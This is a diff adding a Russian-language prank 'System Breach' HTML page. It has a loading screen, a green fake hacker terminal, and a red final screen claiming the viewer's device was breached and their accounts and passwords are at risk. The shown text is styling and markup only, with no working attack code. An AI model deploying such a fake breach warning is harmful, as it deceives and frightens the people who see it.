@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>System Breach // Console</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: #020402;
+      color: #00ff41;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 13px;
+      line-height: 1.35;
+      min-height: 100vh;
+      overflow-x: hidden;
+      text-shadow: 0 0 5px rgba(0, 255, 65, 0.35);
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 0, 0, 0.22),
+        rgba(0, 0, 0, 0.22) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+      pointer-events: none;
+      z-index: 25;
+    }
+
+    /* Очень мягкая красная подсветка по краям */
+    #flash-overlay {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 20;
+      box-shadow: inset 0 0 0 rgba(220, 75, 88, 0);
+      transition: box-shadow 0.16s ease, background-color 0.16s ease;
+    }
+
+    #flash-overlay.flash {
+      box-shadow: inset 0 0 18px rgba(220, 75, 88, 0.16);
+      background-color: rgba(220, 75, 88, 0.01);
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translate(0, 0); }
+      25% { transform: translate(-2px, 1px); }
+      50% { transform: translate(2px, -1px); }
+      75% { transform: translate(-2px, -1px); }
+    }
+
+    .shake {
+      animation: shake 0.2s linear;
+    }
+
+    /* Первое окно: Загрузка... и зелёное поле запуска под ним */
+    #loader-screen {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+      gap: 22px;
+    }
+
+    .loading-title {
+      font-size: 26px;
+      font-weight: bold;
+      color: #00ff41;
+      letter-spacing: 1px;
+    }
+
+    .launch-box {
+      width: 100%;
+      max-width: 300px;
+      padding: 15px 22px;
+      border: 2px solid #00ff41;
+      background: rgba(0, 255, 65, 0.16);
+      color: #66ff8c;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 0 16px rgba(0, 255, 65, 0.24);
+      transition: transform 0.12s ease, background 0.15s ease;
+    }
+
+    .launch-box:active {
+      transform: scale(0.97);
+      background: rgba(0, 255, 65, 0.28);
+    }
+
+    .loader-sub {
+      font-size: 12px;
+      color: #00b830;
+    }
+
+    /* Экран терминала */
+    #terminal {
+      display: none;
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 12px 12px 50px;
+    }
+
+    #top-bar {
+      position: sticky;
+      top: 0;
+      background: rgba(2, 4, 2, 0.94);
+      border-bottom: 1px solid #0d3b17;
+      padding: 6px 4px;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: #00cc33;
+      z-index: 12;
+    }
+
+    .line {
+      margin-bottom: 2px;
+      word-break: break-all;
+      color: #00ff41;
+    }
+
+    .ts {
+      color: #008f24;
+    }
+
+    .bright {
+      color: #66ff8c;
+      font-weight: bold;
+    }
+
+    .cmd {
+      color: #99ffb3;
+      font-weight: bold;
+    }
+
+    .soft-alert {
+      color: #d47179;
+      font-weight: bold;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 14px;
+      background: #00ff41;
+      vertical-align: middle;
+      animation: blink 0.7s infinite;
+    }
+
+    @keyframes blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0; }
+    }
+
+    /* Финальный экран */
+    #final-alert {
+      display: none;
+      min-height: 100dvh;
+      width: 100%;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      text-align: center;
+      padding: 28px 18px 24px;
+      gap: 18px;
+    }
+
+    .final-copy {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      max-width: 380px;
+      margin-top: auto;
+      margin-bottom: auto;
+    }
+
+    #final-alert .alert-text {
+      color: #ff1e2d;
+      font-size: 25px;
+      font-weight: bold;
+      line-height: 1.35;
+      text-shadow: 0 0 12px rgba(255, 30, 45, 0.45);
+      animation: pulseRed 1.2s infinite alternate;
+    }
+
+    #final-alert .sub-warn {
+      color: #ff2b3a;
+      font-size: 13px;
+      line-height: 1.45;
+      max-width: 350px;
+      font-weight: 600;
+      text-shadow: 0 0 8px rgba(255, 43, 58, 0.3);
+      opacity: 0.96;
+    }
+
+    .meme-box {
+      margin-top: 6px;
+      width: min(255px, 68vw);
+      aspect-ratio: 1 / 1;
+      border-radius: 18px;
+      overflow: hidden;
+      flex-shrink: 0;
+      border: 1px solid rgba(255, 50, 65, 0.28);
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.72);
+    }
+
+    @keyframes pulseRed {
+      from { opacity: 0.86; }
+      to { opacity: 1; }
+    }
+
+    .meme-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    @keyframes pulseSoftRed {
+      from { opacity: 0.85; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="flash-overlay"></div>
+
+  <!-- Первое окно при входе -->
+  <div id="loader-screen">
+    <div class="loading-title" id="loading-label">Загрузка...</div>
+    <div class="launch-box" id="launch-btn" onclick="launchTerminal()">▶ ЗАПУСТИТЬ</div>
+    <div class="loader-sub">Автозапуск терминала...</div>
+  </div>
+
+  <!-- Окно терминала -->
+  <div id="terminal">
+    <div id="top-bar">
+      <span>● BREACH SHELL // TTY1</span>
+      <span id="audio-state">BEEP READY</span>
+    </div>
+    <div id="output"></div>
+    <div id="cursor-row"><span id="typing-line" class="cmd"></span><span class="cursor"></span></div>
+  </div>
+
+  <!-- Финальный экран -->
+  <div id="final-alert">
+    <div class="final-copy">
+      <div class="alert-text">Доступ получен. Немедленно отключите свое устройство.</div>
+      <div class="sub-warn">Ваши аккаунты и пароли под угрозой, не беспокойтесь</div>
+    </div>
+    <div class="meme-box">
+      <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAQDAwQDAwQEBAQFBQQFBwsHBwYGBw4KCggLEA4RERAOEA8SFBoWEhMYEw8QFh8XGBsbHR0dERYgIh8cIhocHRz/2wBDAQUFBQcGBw0HBw0cEhASHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBz/wAARCAGQAZADASIAAhEBAxEB/8QAHQAAAAYDAQAAAAAAAAAAAAAAAAECAwQFBgcICf/EAFwQAAEDAwIEBAIECAYMDAMJAAEAAgMEBREGIQcSMUEIE1FhFCIycYGRCRUjQlKSobEWM0NTldIXGDhWYmNygqKys9EZJCYnKDQ1c3V2wdMlNnRERlVkZoWUo+H/xAAaAQADAQEBAQAAAAAAAAAAAAAAAQIDBAUG/8QAJREBAQACAwEAAgEEAwAAAAAAAAECEQMhMRIEQRMFIjJRFDNx/9oADAMBAAIRAxEAPwDYEuitNh2P4PWf/wDgQ/1U9DonTbm//Llm/o+H+qsglaQ7cBP00OW82AoUpIdCaZI305ZT9dvh/qqbFoLS/wDe1ZP6Ph/qq+ihzhTY4MDKNprHmaB0t20xZP6Ph/qqQzh/pfvpix/0dD/UWSQx9PlKsIKdzzjHRPZxibeHulh10vYz/wDt0H9RH/Y/0p/evY/6Og/qLKLpWUlkoJ6+vmZBSQNLpJHnAaFw7xv8WNwvNXUWXR7zR29uWPqQfnf9R9EbPcb+1vqLhPoKF5udq086oaDinhoIHPP+jsueddeIjSclK2PSmirLFNneWstkH7AGrmSquFVXTPmqqh88zzlz5HEkqKZXFKM7dtqVfHK7VMbmMsum4s922iDI/wBBYTcdUVVzc6SdlKHO6iKmjjH3AKhJ2Sc7qhe09tWcg8keP8hv+5OCtDesUR/zG/7lVg4Od0fNlGhpaivbn+Ji/Ub/ALkT69m35KP9QKr5iiOXdSjRaWRr24/iov1AkfGsP8lF+oP9yr9h3KGx9ki+6sDWMx/FR/qD/cm3VjT0jZ+oFFDThDlQVyqSKs9o48f5ARmrP83H+oFHAwgd0CWpHxZ/m4v1Ai+LP82z9Uf7lFI3QLT6pWH4l/Fn+bj/AFAnBVb/AMXF+oFA6dUOYdiUwsPiz+hF+oEn4mP9Bn6oUHJ9Un7Sg7KsRUs7Mj/UCP4hv6Ef6gVbnHcpX2lEie1k2obv+Ti+1gSxO0/yUX6gVWHYSufAzkqj2uI5Yhnmii/UCdE0O35KP9QKi80nplGJXe6VVtfieH+ai+1gRGaHOfKj/UCpPOcPf7UYqW9CEDa7E8H8zH+oEZmpz1iiH+YFSee3sSm3TkuOMkI0NrwSUpOzIT/mhOtMXaKLHs0LHPMcNxgJ6KoeAPnwkGREw9oY/wBQJJbGTnyo/wBQKnbO/OzinG1EmPpIDLLJeaiyP54IaN2N+WaljkafscFtbSHHGit03Lf9IWCvp/Vlsp2PH+gtCirDe5UhtUDjfKDd36F1xwt1wGRQWKxUda7A+HqLdACfqPLgrZQ0RpdwBbpqxEHoRbYN/wDQXmdT1jqd7HxSOY9pyHNOC36l0vwJ8REtukisGqKp0tE44gqn7ujJ6An0QO66Z/gJpfH/AMsWL+jYP6iL+Aml/wC9ixD6rdD/AFFk0E0NZTsmgkbJFIAWubuCEoxjHv6IVWMfwF0sP/uzY/6Oh/qIv4DaW/vZsX9Gwf1FkRaQDkJHKiUlPUQ/lOgT9LCQOiXMz8tnHf71Mhi6JKHHCduynxQkgbo4oeinwxAAJaLRFPS5I6BW9JSYd2Kagi6KzikZTwyyOwBG0uJz2wgOFvG3xaqRXs0PbpnRQRAPqnMP8YT2K4rYQDn962Jxv1A/UvE/UVa5/ODUOY0k9ADjC181uyuSVnle+g5gUlx32S+UegQ5fYKkmwTlKSi3AzkJKR/egQQQyg5lsMII8ot0HRHBRsaM4TscLn4OFNgpCXBxHRSUhFPSh5HopzaOMDcJ9rA3oEpB2GhSR4Hyp1lHESctA+xKa7GE5z+pTBBt8B7BNPtMLiTgZUjzB6lGJAO6NC9q2WyDq07+ygS2maM8zcnHsskbMB33TzXMPZA0w10MjD8zSD7potcOoKzh1PFINwM+iiVFDC7IACR7YkAjKsKu3lpJaMqC4OZsW4TBACNBBVoaBBBBKxNgIEbBBH2VYxMnYwT2DcI9zsW/cgBgIwr1FaI5CEe4TiLCr5hj5yEoTEDCSeiThRcYEpj+yXnDshQslLY4g9VNwkKXaxjkPQp9kpbuMdVXxu5k+08qnRuyvCfxTqro+XR9zldLIxvPSOedyO7V1WW8pwvLHQ2ranReqbZe6Z5ElJM15wdy3IyF6haavtLqqwUN4o3B0NZGHjBzg9wllFS7PyM50gQhS/KcXdE4yD5lJ1hz7zQMLeesi3xjLwsgoXxTsD2Pa4exXEuldG63vNbD+RqvKyPne84C7I0Dp+os9nYyscZKg7nJzhAjKIQMKZEOvv0SI48k7bKRG3GyDSIhjCx7ijfP4N8OdQXID5oaV5B+sYWSMGwK1X4lan4bgxqd3Njmg5UJrynr6x9fX1NS85dLI55PuSkNIwosZJLk6CQFUZ6O5QykcyMbrUxk7JCUgRk7JWJs2SiOc7I989E5G0E7qRo1ggZwpMEJduQpDIAWqTFFjr2QqQUUQAClRkNBACbLgOg6JJkwoqz7pBuk8/uozpOqT5p9Ep0SYHd0HS+iiCQkZ3Sg9PZydn/NPoleao/Mjx7qdr0f80JxtRgqJnCIu5RlVtFixbVHCakqub61BExKS6XKE7TTICN8Kuq2sIPYoi9wPVNu+bOSgbQj1KI9EqQ7kJOUJ2ASuREBjdKac59lUPYBiGEpKDCcbK8ei/ZI6IBLMZCLkKva4GEEORyMNPdPcIRCBxhAsJ6IvLclbAQlt6IizBO/RBp2UHo/FudlKHRRafqFIztlSRXN6jP1rszwd8SPOhqNIV0w52flaQOP0vULi7O2VkmhtVVWkdS2+70khZLTSB2fbv8AsUUb1XrT5BG5690prR7KHpq8wan03arzTODoq2Br/lPQkbhWYjA6KapiNIyjtVmMtOGu5G5+U7uT+ir4dSUU07qd8PlPLMPGM+64x4acZ7tRVFPBWVLpacOAcHnOy6X0vxfoLrcY6KnpOUP6uAxv6pnG4GM9E4G4RQuD2At7pwdQgzjNhutI+LapNNwVvOCfnw0rd4WiPGL8vBG6O/xjR+1Ca8uo+6fCZiGWp4dU0waMIkYWkrPZRwUWEM4RF26e1SlYUmGHmIICZiaXkK8ig8uIEtUW7OQ3HGA3dE94GwSJJC07KLI9w3ylqmcdJud0gvJ7qOZcojIkr3o+X9so2ux2UcOzhPN2T0NHef1ShIM9AE0i6JaCRzg9glB4PdRgThGHEJfI+knmSHOy0pgkkpTGud1KD9EUjmClfDn0yi+FcfzUC8dqNnKInYqU+lc0ZITLoy3qE9puNiC9mSmztsphbv0TErfmz0Qiw32Rj2RE4CDT39Fc8KQ6xu+5UluFE8zcJzzgBhM4k490OXuo7ZslLEuyNKOc3shgFN5JTgOykthjCHMiLgUk7p7GzLwSSkhhTyH2Koi5UcTcEJ49Am29U5jOFNViLsgM7odClJUZevSvwhXGS7cGaNs5yaWofE0+2x/3reAZjK0P4K4ubgzkD/7bJ+4LfTgW5yFLV482S9y0tW17iQAdsLpDhlfn1VfRSU8bnyl46ei0DpvTT66Rr5GnkO2w6b9V2v4b9G2yV0R5A6eFoJz1WH8hR0tanGW2UziMOLASPdSuUA9E82mMTQ1uAAkuYQegWsu1EhaG8Y5/5kbn/wB439632ButC+MZv/Mjc9xtKz96qFXl/CPlTiQwcgA6pYO5VJvnQIIIIZAhhAdCfVDBOyFTtZWynNRINsBXNW8Rxhg6hJslG6OnD8D5lLfaKmocXNAwUSdtMZuMfmJ6hR5MlpyfuWQzadq8bNCr6i01MLTzRn7kWC41SbpTfdOuge07tI9kGwOJ6JaT2SB0T7WkhPQ0EszgA3qVkdDp172gubv79U5GklYzyH0KNsbicAfes9ZpfIBMeT7qZFpIvO7MfYnqq/ja9ZRvIA5TlOtt73nYfsW0INHAgEhWFNo5hx+TOfqVfNaY8UrUzLJUO2DdvUhTqbTlQ/GQFuSm0dESMxq8pNJU4G7GjZZ5StseBpWHS8zsZafuUn+DUrerThbyZpmBvYJX8GoO7R9yz7b/APH3HPdZaZadvzMJb7rH62n5ckdF0VfNIskgIYwHZaf1PZJKDzctI29EnPy8PzOmAvGCkOjDxvnKkvZuk9sK8a4Mle6Mgn2SRspj2hwOyikY2V7QTgdUrfCRndLzjZOVMo/zT6oA7dUkogSrjSZHQ8+qdBJCjnopDHZwEUqASkQGEalIIIIIIbfpFLykN+klE4SrXECUbT6lFhDGAp2Vekvgar6er4U1VCHAz09U5zmjrg910fV0bWjI29lwb4Bb/UQ61vNo5/8Ai01N5vKfULvSvqhzEZBBTaS9PNW2aUq9P1s1HV0z4nscR9E4xk4K684Z0OmNG0lLIyvH41qIWukZzbj7FQ6PvNu1NRNlvFLG6o5d5AwZO3Rct8TdaM01xjqJ7fVSPpGlofGJPlac74C83GZbD0IGtrS6cRPqG857ZCtWV1PUAGN7Tn3XnRR8VnS3OWsNe7Odml3QLK9LceauC6kvq+eMdBzLslU7waQTsQVo/wAYEfNwOuu2T5rFkXDfiC3VJYWPznqFT+LiMngXeiRuHsWkTXlaOoSh9JNsPME4qToEEEEMr1QAyE/SQmaeNu5yeyZaryxwg1UbuXO4QvD1n9ksj5YYWBudlndFpuOKFoMQJHVS9B2d0tKamVuGdGhZZJSBjjyjZVI7OPGMQNki6CEZ+pVNx01HI04Zus9dFglQamnyM9lpMdtPmNSVmlGh+zc/YmI9KNLxmP8AYtqOo2b5bn7EgUcY/kwr/jT8SdsGo9MMjIPIOvor+ltccQGWZI7q+ipGZ3GFJbAxvRqqcapjKq2UDSBhmVLhomD83CnxwDG4+5SGMAGMZR8yH8wxDTx/oqdFBjsijZupbB0UW6dHHjAhhPborCKIY6piMYAUmJ26xydeMONhBHVOeS07YCAOMJxu5ysMrprL1o1JTczfZa14g2Bs9LI9jfmAK2rGMkj1VJqS3/EUUrSM7LK3tlnx7jkKqgdBK9jhuCoePmKyvVFCKS4SgjAysdMffstcXg8+FmaJyjcdFFmbgqfIwYzjcKO9nMDlWw0gd0ZSnjlOElOI0PsiHZBBVKNFkeydi6pjnTrD8qudqP7IkyH4O6ezlKjQIIIKSG3qlFIb0TgRtpJ0AO6M79kl30kpu6jwtOmvA5IYuLNSAcB1C/Zegc7eabdxXnz4IpCOLrxt/wBSkXoXIweaTg7qlybefWpOOVJpfSRpKFrDdZW8jQPzRjrlcszXGouNbNV1ErpJpXFznE7klTLpI6ulMriXEbAKDHTOGcDHqsZjJ4JVnQRS1lRDTw5M0zgxp9yuz+FHhQkZRQXC9yOc+ZoeGNz0K5+4L8L7tqe/W65tgIt1PMHl7jgHB6L0+tLg2hp2s2a1ob+xNSi0Jw9otKEMpQSBvhwWBeMq6Q23gjco5CA+plaxrT3Pst5UmTID6hcxePmilfwxtkrS7y2VA5gOndVCebcXQ/WnEhmwwlZVF+hoIIJscu6Uzss20tbHVEtMB1eQP2rCY93tC29w7pQ+4UQP5pyUNOOdt8WmgbRW+KJrccoAKKoeM49FYFwbDthVMzvmK1xjtwnRiV5CjvPNsQnpDnKYecHC3xizLmblILcJ4pDxzAYW5wjAyltwCi5UMgIPpIZggJ1uMqPGeU5T4KjRw60j0T8TsA5UVpJOAn2ZJWWUb4pbH7KRGdsqJHsVJiOFhnNOjFKzsMJ0EhMM3TuVz5RtEyPbCOsi86nePUJqJ2VKwTt2WP7NzHxGtslLcHkxnlJJWAOZ1yt78VrNJvM3O/stHvaeZwPXK0xrx/y8PnJCkYOVQXNIJVpIzZRpI1ptw2KifIOU2pVSzGSoo2CcRYCCCCadCDcFPYCaRgnoqhD7qRGctUfOPtT8YwwJ5eGWgggpSDeicCQ0ZCWk1ngjuUAT2RnojjZzHuloq6M8Fcwj4xMadi+lkAyvR6saIIi9xGAOq8uvDNeDYOMNgnDwBLJ5J9+bZenF8oqy81ENvpcsiOHPlHZqrrS8XjQ+lnYXMkjdGQeXld1V3a7Eypt81U+drXRnHI7uuj/Evw7s1i1Zcaq2RMp4Tvhg+XK5bfUSc7gx5cPZcmORSOi+FnEt2i9JU1E6BhjfIcOJ3yV2nw4u8t7tcUuAWPbzAgrzMonyT6apwDzSRyAgZXavBnXM9BYqVkrQAGALSU3VlBTEAE9fRaL8atDHWcD7i5w+aCRrh7dVsCj17Tvga5z2jb1XPPi24jC48Nqu2RuDhK8ZGVcp5TTzqbsU4k8pH1JbeqaNjQQI3HugOo9lTI5D8sjSegK3ZwsHxNxjc0bNblaWjAPTst48FMTVbx+izCrGN+OdtzyHDcdlWSE8xVhUDDR6Kud6rTF2Ym+vVMO3cfVOuPVNAZdlb4HSSMdUlHIfpJDf4w/UtYcGehSMpePlSMYRTpYdspEbshRR0TkZOUCJcf0ipDNiozHZKktPos8m2B5nVSIzkKM13L1TrJW53Oy5+SOjGp0fVPYUNkjQNjupMc3MQMrDJtjUiE4Knx9M9wq8FSon9lz5K2x/W1vFfb5By5cAuYb3RupK6RpBAyuvKyBs8DmkZyufuIdkbT1cpA2zlGNcn5OO8WrnDIKjyDKspYQGkhQZWrR5NxVVU3Y5VeXbq2qmfKSFUuHVVGWQA5RpLUeN1cRYNAdUEB1VIgypDT8o+pMIxlXe5pWklBJ5spWcqE2DYlpDEtRWmPgAZT0Iw5ND6JTkTt8JhlOh691r1jYqthLTHWxHI/ygvY6OvhpbXDUOxl8TXe52C8ZNNn/lFaQTt8VF/rBett1ribVbmAggU7B+wJWrxeefH7ifRawroo7ZJz07Rl8ndxWltO1lJR10k9VGHx8hwD6qgD5H5aSXYKS9r2g5BA6brlmOiXcd+DJ3GIFkRcTgLoLhbxLoxTMgnkALABuuabdb5a6YMjaTn2WzdKaV8qWPznEE+ie9H26fqNc0xpz5c2xGQAtP8U7yL1YJ2E82DsCrFtqZTsbhxcAAsS1s7yqFzB1J3CuUXemjbjSGBzT2KhAYWUaopDT0tPIcDzRkLFwNlrEDHzAZ7IgUAgVTI/GPlPut38CXj46oaf0StGhxBW3eBldy3x8LjjLU46ONv2pGWHHZVb3YCsKyVsbCOYDKpZKuPoXjIW+GnTMiycpPRMiri/nGpp1WwEnzG/eujGC5JL+UjBO5TBdyuJCYdVw4J5wU0axjiAMFa6gmSZz4BSDIohqAewRCUlFjTe00SZCU1++xCrZZeQEqBLdHQkkZwoOVlEc26kCZrergtb12qZYPog5VRLrCsnJDebZTpf3pt+SuiY3POCoL7pH2cPvWrqe6XCqdjmcB7KyhFaSOcuPus84rHlbAZdyT8pz7KxpblkdP2rCbc2XI+U4V/SMcD03C48/W+PJtl0NbzgAgZU+GbOFjlOHbZVxTkjCwyjeZdLVsoI3WB8QLQ2opjMGZwPRZmxxUO+QCe3yAt3Ays0ZTcctXCIxyyM5cAFVEjFlWowBcJGgYxssfkjLj0Ws8eblj3pEprXUXSbyKaIyPIyQqG5W+e3VD4KiN0cw3LXei6H4b2GK1Wr8ZVMbfMkHy5HZa+4x0kQro66BuOcYJwnMtlyfj6x+mrBkJQSAc790eFpHD56UjA7osH0Q6FVEY+lgZKVyoBETha6WMOwltfkbdU1zFORnIKnRWdHm7Jbd03nCW3rn2UUSj5uoS4h8wTfXZPQx9/VI1rZpBDera89G1EZ/0gvVqaZs9ot0gOWup2H/RC8mG1PwlRFIP5Nwd9xXp3w/1GzU3DCxXNrgXOpGtO/cBKrxceS8GaCibLLHI1zS4loI7KurOGENZaKh7GMD2ZOw3Uu68W6a2X99tmJkpWOw57T0Vlf8AVzKLSE9yo3kQzny43HuT1XDPo2vdJ2GOnZK7kw9ji1ZXTsdHMCzqFW6Kd8Rbg9p5zKS5zitjWfTsU7POmcGjOwRuqkR6d0ksQy09FimubdJS2ipr5twzBDVtT8XwQRgNxtt1Wv8Aiy7ytKVbR3AH71eOW6LHNVzvE90nBleSxmQ1vooecpVBQVFyqo6WlidLUSuw1jRklbk1Z4dL9ozh63VVzqoY3cwBpQMuwe66WVn6abQSQ7JSlbL57Dmxus94OVRi1Y3fq3CwJwysu4Vny9Y0gPRxwnI3xdB3utlMpAJx0WMVU8++CcrK73RllSTzfSWM100FIHc7unutsY1nijnq61pPKXKulrq9oceaRWFZfYomOLIy5g3JWPTaqgkPytDQumeFcpE2mrqzmBe5yyWgrXkDmJysQprvHU7AjdXdHWhuAei1jOcnbLI5y/ACksCraI+Zyq3iYm6sezc0fOw+qp6mA7rI5IvlzhVtS3lBOFla1+LO2MVFDG/d7cqKG0dKSS1v2qTdrh5LSGt67KotVC+9VjY2kgE7o2zyT3X2ioxzBo+xOU+tKR0ga4gDKq9c6aNjbCeYkHf6lgscTnSBuDk9FOUZ45VvW23alq+UsI3V7TVDebZ3VYxadKSU+nKaua4CVzebl6KdboKjAL8ri5I7OK7ZrSuDiPmCtIcZVLRbMG+VcU52yuezbriaxCraJKOUf4JSWN2ynMB8T25/NIWOXVXrbmTUkR/G8w7BxTdvs8lbLGGsyC4BXGoaIuv9Qw75cdvtWX6XtUFJNF5zgwuwQHKpl0x/i3Vre6OShsFPG0lrWNAwFrHiQxs2lY5er+cbldAaktDKvT0vKQS1oIwuf+IZMejw0jB83ATw9P8AJx1xtMt2TjUwxzs9cp8EZ6roj5/OF5KGMouvRKyrlTKMHCIgFAnIRYyTha29LKaxOtbtslRDATmFnsUnlCUBsghhRSkER6dVJiIDR7JkbJXNjfunZozVUHVEzI2bueeUD3XpNwys8mkeEVppJ3HmZS+Y7OxGR0XnHZvymobcHDI89n716A8WuIFPpjQZY2QB5pg1oB78qS8XGfDfQ9PqjU1LJe6yOK2PfzSyPdjIHZTONGqbfX3aPT2nvksNsyxgb0e7ufda7fWT/DthEjhGDnAOFEDSXZPUndc2jnbOdI6vNoiEUkZMY6LLncUZ+RkdPkNLui1TGHCLLRkqbSwzOljxG4g75AWdi46fsd2+NtkE0jhzubk5Ws+Kt4muNDJb6eMySOcAGsyXO+wLY/CHQFy1dG0TSCGiiwHepXRFk4Y6WscsdRHbo5KqP+Umbk5Tx1s/XNPhp4Wy6dlqNQ6gtEnnPGKeOWPflPf9iyLxS3m61WhR+QkpreJg0h22SV1TFJCGBnyADYDthc4+Mqsi/seU8AILjUA4HotsbtGUcFg90pIASytIxgz0WU8OJWw6xtznbDnAWLOOyn6eqzSXygkBwRM3J+1XGmLrW9xl8pONuy1bqC3VNZVPbuG8w+5bdqSJoIXAj5mB2fsWO1UDeZ/yjPqVvg1ninbp2lk0vOxjWGp5e60hU2+WKZ0L4iHA4Oy3vG59OH4kx7ALG7nRwTTuk5AXdyumeM8sd1hVltXkhrjseu6tw4xyNG+xVhHA1mcfcjFHzPBVbTMO13a5CWA+yyOjHPgqjtkOA0HZZNRQhrApuT0eHBKdECwbKmrItznYBXx6KvqYOfP7Vjcu3XePpr2/0zs/KNiUxYXyWyYStBz1WXV1qbMMnOyozbJGk4ADQql25c+Ori6V9LqCkMNRCS7H0j2WPW3SVFFUCVzCQDsCranpnjA2Bx1VtBGWbHCusZx9rsTF0UUA2ijAAA9FJbGGtADR9YVbTOLSM7nsrKOXK4+V2cWGkikGHn0VvT9AOyrKfclWsGwK5nbjikl2AEDJysdnbZNk5SJz8v2LDP1pMGuYrIa/V5y35SVY8RLFJZ56OpiJawAdFklopBHePN2TnE+oiqLXHHkcw7ZU7Ew0TpG8m5W99PM4OLo8b/UtJ8bWNttppKTGDJK562LodpjJIzsFqDjvdxXajjpQ7mZTs/aVpx+uf8z/AK61KzqU6OqbYPmTrBjquh876UDgo3HuiQ6qp6xvvRYI6JyMAlNNaQfVPwtwVplWsPhuEfRKPQJJWctBWQiJ9EjIRgZ6I2Ck06QA9Ub3coIUXmBySq19Bcafc38eUDj/AD7P3rb/AInKy7SX+ipmsm/FTaSNzSGnlJI33Wl7O8MudE7sJmfvC9Brzpui1Voy3tqoI5C6nYMuG+MeqjL+2bXi88yySOXlP7VkemdLVOp65tJTcvOQTv7JV2tTXwioZs5p3wrPR1dUW67U9VSOLXxOB27jO4WVhytp6d4MlkbRWuixjdTqzTFvtAIY2Ihm2SVi+t+Il4qammgtjzHTjBkPr6rHdZaz8+mp2QyZeWASAHusj26g4a6zpLXa5KdkrA/mzkO7rNjrL4ok+bkZ3Oe65N4JWC66srnxQyubC7oTnr6q01Lf79onVdZYq0gPY8cpb3B6KPFTp1ANTgbiTK5s8V2qXVtJare12WuJe4hZNaNQTT08Uj3HmK0hx9uDqu+UTCTgR9Vrx91OVamCNEOqNdEYfsR6IoNqmFw6h7SD9qURkJLQRPF68wTXHZNseZ7DQyH6XlNH7FCqY85KkWPP8HKH/um/uRTNDmu3XRx+OjCdMeqGYJ9yqiopi52yyKojHNuFEMPMei6p4r5U8VCdzhS2UwbjIU4RYSgwd0XxeGEtJpoeUjA6d1e07MMBVZBsR6KyjfhoWGdunocWEPndMyDJThfsmS8h25C5LlZXZ8C8rI6bKFNTNJd8mMqf5mNkT/mB9VphlbWfJjNKfyQD0wU4G4Pun+XLz3S/Jz3W9rl+ZsItiFOjGMKLGzB3U2JvqsMq2xxToBgkK0i6FVkA+YKyiOy5snXhCi7CQ45yEp5yEgDJWGTUVIfJqOcg4HosUvFsul+uzsROZTjo491lriIvmP7VOpZRNECN/VZhQQ26Gw25ziPnaOZ5z2C5D1jc/wAbahr6nm5mukPKfZdRcWr02xaTrZA7E0o8pn2rj17i5xJyST1XRxTp5H9S5Nf2w7GNyfVOplmRt3TwWzxARt6okC7H15VRnf8AJIYMlSAzlTEDsnopAORuntcGmpicbJ1IkbkIhozHEuUhhUZ2wKkw/wAWCnYDcucpkNwpcje5UMntlOBKoTy1cDh+bI0/tXo5pyoE2g7TNgHNO0fsXnBSH8qw+jgfrXoHoKu+L4U2Z+fmMYH3LHlqsfXFFQaqdr3siIifumKW5vtow0HnO3RbQu9JSxR+VBGOQ7DCoH6fp5ztHl/bCi0ptWUt1+GtsskrQ98m2SM4WJVMPxEzpMfMVl+obUbfRtc75RzAYTWnNPC8zOHPgBZVbpHw0a80lYdNeRdZ4aStgdhzpOpHXK1vxVvkev8AilW3ShDnUXMGRux1aO6r6HR0NC0+YGPPYlW1HQRUZwxoHsAssp2uLKjzDDGxv5o6rTHGCbz73BzblrMLc7TjYLRXFSYP1CGg9AtuNOUYRhGgOiC6YwnoBKjOamEf4QSDsEdPl9ZTgbkvaP2qo0jsayNzp6hH+LH7kUjc5SrO0x2Kiae0Y/cilOQ4+y6OOdOvjnSsqGglRnjlCkyn1USc7BdWPi9GHzFGx3NlR3H5inInYzlGTTFLhJzhTWZwAoMDwFOjkHsVhnOnbxU/vhMvyE9z7dE2/dpzt9a488e3XvpBkqOR30k6ycPbnKp65xD8ApykJ5c7q+OMuTLpaMOXqW1md1BhJyp8R2C6LGEpQZgdFLiZkeiQGAgbKTG3BGFjlG2GjsIwcKbGcNKiMac5Upmy5s43xpZdkdEG9QUCjb2XNn6qZbRrpMKeimmIyI2lxH1KJpjUdHWxgtnjGRnBeEnVD/KsNe/HSF37lx6L1WUzpGQVMsbSSPkcQjDD6Yfk/kzi6bQ47a2jvd2Za6KUSUdL8znDo560zjJz0T7nF55nEuJ7k5SCN11YzUfO83Jc8rlSmjfPql5SGjCWB7JsLRoBuShhORNJKfaIkRNwOm6dCQ33SwQiNIGUlzsA/UjRO6H6lUNEcdipcQxG0eqhFToSCxu4ynl4QjkghR3s5SPdSSNymZ/zVMtFIgOXgdF3TwdqhNwmt4zktJH1LhSDZxONsLtTgROJOFVMHfmyOG/1rLlXx93tpiyVENznlia/nLFkTLeyB4cBnK1hwpqTJqKeIOyJI3H13W43N5dvRRYbCOINLzWF8o6sdlYZoC7Pp7k2Jz883QLZ2p6